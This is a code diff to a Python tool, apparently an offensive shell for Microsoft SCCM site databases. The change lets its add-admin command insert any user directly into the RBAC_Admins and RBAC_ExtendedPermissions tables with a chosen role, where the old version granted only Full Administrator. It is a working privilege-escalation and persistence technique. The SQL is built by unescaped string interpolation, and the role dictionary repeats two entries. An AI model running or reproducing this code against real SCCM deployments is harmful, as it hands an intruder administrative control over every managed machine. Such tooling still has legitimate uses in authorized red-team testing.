@@ -597,6 +597,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
         split_arg = arg.split()
         if len(split_arg) < 2:
             logging.error("Did not get expected 2 arguments [username] and [role]")
+            return
         username = split_arg[0]
         role = " ".join(split_arg[1:])
 
@@ -611,8 +612,32 @@ class SCCM_SQLSHELL(cmd.Cmd):
         sid_enc = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
         logging.debug(f"Hex encoded SID: {sid_enc}")
 
-        # Add "Full Administrator" role
-        query = f"DECLARE @AdminID INT; USE CM_{self._site_code}; INSERT INTO RBAC_Admins (AdminSID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite) SELECT {sid_enc}, '{username}', 0, 0, '', '', '', '', '{self._site_code}' WHERE NOT EXISTS ( SELECT 1 FROM RBAC_Admins WHERE LogonName = '{username}' ); SET @AdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{username}'); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) SELECT @AdminID, RoleID, ScopeID, ScopeTypeID FROM (VALUES  ('SMS0001R', 'SMS00ALL', 29), ('SMS0001R', 'SMS00001', 1), ('SMS0001R', 'SMS00004', 1) ) AS V(RoleID, ScopeID, ScopeTypeID) WHERE NOT EXISTS ( SELECT 1 FROM RBAC_ExtendedPermissions  WHERE AdminID = @AdminID  AND RoleID = V.RoleID  AND ScopeID = V.ScopeID AND ScopeTypeID = V.ScopeTypeID );"
+        # Hash table for role permissions:
+        perms = {
+            "Full Administrator" : "SMS0001R",
+            "Read-only Analyst" : "SMS0002R",
+            "Remote Tools Operator" : "SMS0003R",
+            "Asset Manager" : "SMS0004R",
+            "Compliance Settings Manager" : "SMS0006R",
+            "Application Deployment Manager" : "SMS0007R",
+            "Application Author" : "SMS0008R",
+            "Application Administrator" : "SMS0009R",
+            "Application Author" : "SMS0008R",
+            "Application Administrator" : "SMS0009R",
+            "Operating System Deployment Manager" : "SMS000AR",
+            "Infrastructure Administrator" : "SMS000BR",
+            "Software Update Manager" : "SMS000CR",
+            "Operations Administrator" : "SMS000ER",
+            "Security Administrator" : "SMS000FR",
+            "Endpoint Protection Manager" : "SMS000GR",
+            "Company Resource Access Manager" : "SMS000HR",
+            "CMPivot Administrator" : "SMS000IR",
+        }
+
+        # Add role
+        RoleID = perms[role]
+        logging.debug(f"RoleID selected: {RoleID}")
+        query = f"DECLARE @AdminID INT; USE CM_{self._site_code}; INSERT INTO RBAC_Admins (AdminSID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite) SELECT {sid_enc}, '{username}', 0, 0, '', '', '', '', '{self._site_code}' WHERE NOT EXISTS ( SELECT 1 FROM RBAC_Admins WHERE LogonName = '{username}' ); SET @AdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{username}'); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) SELECT @AdminID, RoleID, ScopeID, ScopeTypeID FROM (VALUES  ('{RoleID}', 'SMS00ALL', 29), ('{RoleID}', 'SMS00001', 1), ('{RoleID}', 'SMS00004', 1) ) AS V(RoleID, ScopeID, ScopeTypeID) WHERE NOT EXISTS ( SELECT 1 FROM RBAC_ExtendedPermissions  WHERE AdminID = @AdminID  AND RoleID = V.RoleID  AND ScopeID = V.ScopeID AND ScopeTypeID = V.ScopeTypeID );"
         self.__run(query)
 
 if __name__ == "__main__":
